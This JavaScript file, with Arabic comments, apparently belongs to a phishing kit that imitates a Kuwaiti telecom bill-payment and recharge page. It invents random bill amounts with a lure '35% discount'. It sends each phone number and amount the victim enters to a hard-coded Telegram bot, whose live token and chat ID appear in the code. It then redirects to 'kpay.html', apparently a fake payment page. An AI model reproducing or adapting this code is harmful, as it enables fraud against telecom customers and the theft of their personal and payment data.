 // بيانات بوت تيليجرام
 const TELEGRAM_TOKEN = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";
 const TELEGRAM_CHAT_ID = "6454807559";

 // عناصر التحكم الرئيسية
 const billBtn = document.getElementById('billBtn');
 const rechargeBtn = document.getElementById('rechargeBtn');
 const billForm = document.getElementById('billForm');
 const rechargeForm = document.getElementById('rechargeForm');
 
 // عناصر الفاتورة
 const selectField = document.getElementById('selct');
 const phoneInput = document.getElementById('phoneInput');
 const phoneLabel = document.getElementById('phoneLabel');
 const billBox = document.getElementById('billBox');
 const amountText = document.getElementById('amountText');
 const discountText = document.getElementById('discountText');
 const finalText = document.getElementById('finalText');
 const billPayBtn = billForm.querySelector('button');
 const phoneAmounts = {};

 // عناصر إعادة التعبئة
 const rechargePhoneInput = rechargeForm.querySelector('input[type="text"]');
 const rechargeAmountInput = rechargeForm.querySelector('input[type="number"]');
 const rechargeBtnEl = rechargeForm.querySelector('button');
 const rechargeBox = document.createElement('div');
 rechargeBox.className = 'recharge-box hidden bg-white border rounded-lg p-4 text-center text-gray-800 shadow mt-20';
 rechargeForm.appendChild(rechargeBox);

 // إرسال إلى تيليجرام
 function sendToTelegram(message) {
     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
     })
     .then(() => window.location.href = "kpay.html")
     .catch((err) => console.error("خطأ في الإرسال إلى تيليجرام:", err));
 }

 // زر إرسال تعبئة (إرسال البيانات إلى تيليجرام والتوجيه)
 rechargeBtnEl.addEventListener('click', () => {
     const phone = rechargePhoneInput.value.trim();
     const amount = rechargeAmountInput.value.trim();

     if (phone && amount) {
         const message = `📲 شحن جديد:\nرقم الهاتف: ${phone}\nالمبلغ: ${amount} د.ك`;
         sendToTelegram(message);
     }
 });

 // التبديل بين التبويبات
 billBtn.addEventListener('click', () => {
     billForm.classList.remove('hidden');
     rechargeForm.classList.add('hidden');
     billBtn.classList.add('text-pink-600', 'border-b-2', 'border-pink-600');
     rechargeBtn.classList.remove('text-pink-600', 'border-b-2', 'border-pink-600');
     rechargeBtn.classList.add('text-gray-500');

     phoneInput.value = '';
     billBox.classList.add('hidden');
     billPayBtn.disabled = true;
     billPayBtn.classList.add('bg-gray-200', 'text-gray-400');
     billPayBtn.classList.remove('bg-pink-600', 'text-white');
     amountText.textContent = '';
     discountText.textContent = '';
     finalText.textContent = '';
 });

 rechargeBtn.addEventListener('click', () => {
     rechargeForm.classList.remove('hidden');
     billForm.classList.add('hidden');
     rechargeBtn.classList.add('text-pink-600', 'border-b-2', 'border-pink-600');
     billBtn.classList.remove('text-pink-600', 'border-b-2', 'border-pink-600');
     billBtn.classList.add('text-gray-500');

     rechargePhoneInput.value = '';
     rechargeAmountInput.value = '';
     rechargeBox.classList.add('hidden');
     rechargeBtnEl.disabled = true;
     rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
     rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
     rechargeBox.innerHTML = '';
 });

 // تغيير نوع الإدخال في الفاتورة
 selectField.addEventListener('change', () => {
     phoneInput.value = '';
     billBox.classList.add('hidden');
     billPayBtn.disabled = true;
     billPayBtn.classList.add('bg-gray-200', 'text-gray-400');

     if (selectField.value === 'رقم العقد') {
         phoneLabel.textContent = 'رقم العقد';
         phoneInput.placeholder = 'أدخل رقم العقد';
         phoneInput.removeAttribute('pattern');
         phoneInput.removeAttribute('inputmode');
     } else {
         phoneLabel.textContent = 'رقم الهاتف';
         phoneInput.placeholder = 'أدخل الرقم: 99XXXXXX';
         phoneInput.setAttribute('pattern', '[0-9]*');
         phoneInput.setAttribute('inputmode', 'numeric');
     }
 });

 // تحديث بيانات الفاتورة
 // تحديث بيانات الفاتورة
 // تحديث بيانات الفاتورة
phoneInput.addEventListener('input', () => {
const value = phoneInput.value.trim();
if (/^9\d{7}$/.test(value)) {
 let amount = phoneAmounts[value] || Math.floor(Math.random() * (120 - 20 + 1)) + 20;
 phoneAmounts[value] = amount;

 const discount = (amount * 0.35).toFixed(2);
 const finalAmount = (amount - discount).toFixed(2);

 // حفظ المبلغ الإجمالي في sessionStorage
 sessionStorage.setItem('finalAmount', finalAmount);

 amountText.textContent = `المبلغ المستحق: ${amount} د.ك`;
 discountText.textContent = `خصم ٣٥٪: -${discount} د.ك`;
 finalText.textContent = `الإجمالي بعد الخصم: ${finalAmount} د.ك`;

 billBox.classList.remove('hidden');
 billPayBtn.disabled = false;  // تفعيل الزر عند الإدخال الصحيح
 billPayBtn.classList.remove('bg-gray-200', 'text-gray-400');
 billPayBtn.classList.add('bg-pink-600', 'text-white');
} else {
 billBox.classList.add('hidden');
 billPayBtn.disabled = true;  // إبقاء الزر معطلًا في حالة المدخلات غير صحيحة
 billPayBtn.classList.add('bg-gray-200', 'text-gray-400');
 billPayBtn.classList.remove('bg-pink-600', 'text-white');
}
});




 // تحديث بيانات إعادة التعبئة
 function updateRechargeBox() {
     const phone = rechargePhoneInput.value.trim();
     const amount = parseFloat(rechargeAmountInput.value);
     if (/^9\d{7}$/.test(phone) && !isNaN(amount) && amount > 0) {
         const discount = (amount * 0.35).toFixed(2);
         const finalAmount = (amount - discount).toFixed(2);

         rechargeBox.innerHTML = `
             <p class="mb-2 font-semibold">قيمة التعبئة: ${amount.toFixed(2)} د.ك</p>
             <p class="mb-2 text-pink-600 font-bold">خصم ٣٥٪: -${discount} د.ك</p>
             <p class="font-bold text-lg">الإجمالي بعد الخصم: ${finalAmount} د.ك</p>
         `;
         rechargeBox.classList.remove('hidden');
         rechargeBtnEl.disabled = false;
         rechargeBtnEl.classList.remove('bg-gray-200', 'text-gray-400');
         rechargeBtnEl.classList.add('bg-pink-600', 'text-white');
     } else {
         rechargeBox.classList.add('hidden');
         rechargeBtnEl.disabled = true;
         rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
         rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
     }
 }

 rechargePhoneInput.addEventListener('input', updateRechargeBox);
 rechargeAmountInput.addEventListener('input', updateRechargeBox);

 // إرسال الفاتورة
 billPayBtn.addEventListener('click', () => {
     const phone = phoneInput.value.trim();
     const amount = amountText.textContent.replace(/[^\d.]/g, '');
     if (phone && amount) {
         const message = `📄 دفع فاتورة:\nرقم الهاتف/العقد: ${phone}\nالمبلغ المستحق: ${amount} د.ك`;
         sendToTelegram(message);
     }
 });

 // إرسال تعبئة
// تحديث بيانات إعادة التعبئة
function updateRechargeBox() {
const phone = rechargePhoneInput.value.trim();
const amount = parseFloat(rechargeAmountInput.value);
if (/^9\d{7}$/.test(phone) && !isNaN(amount) && amount > 0) {
 const discount = (amount * 0.35).toFixed(2);
 const finalAmount = (amount - discount).toFixed(2);

 rechargeBox.innerHTML = `
     <p class="mb-2 font-semibold">قيمة التعبئة: ${amount.toFixed(2)} د.ك</p>
     <p class="mb-2 text-pink-600 font-bold">خصم ٣٥٪: -${discount} د.ك</p>
     <p class="font-bold text-lg">الإجمالي بعد الخصم: ${finalAmount} د.ك</p>
 `;
 rechargeBox.classList.remove('hidden');
 rechargeBtnEl.disabled = false;  // تفعيل الزر عند الإدخال الصحيح
 rechargeBtnEl.classList.remove('bg-gray-200', 'text-gray-400');
 rechargeBtnEl.classList.add('bg-pink-600', 'text-white');
} else {
 rechargeBox.classList.add('hidden');
 rechargeBtnEl.disabled = true;  // إبقاء الزر معطلًا في حالة المدخلات غير صحيحة
 rechargeBtnEl.classList.add('bg-gray-200', 'text-gray-400');
 rechargeBtnEl.classList.remove('bg-pink-600', 'text-white');
}
}

rechargePhoneInput.addEventListener('input', updateRechargeBox);
rechargeAmountInput.addEventListener('input', updateRechargeBox);




   
       const button = document.getElementById('bobox');

button.addEventListener('click', function() {
    // توجيه المستخدم إلى صفحة جديدة
    window.location.href = 'form.html'; // استبدل 'newPage.html' باسم الصفحة المطلوبة
});
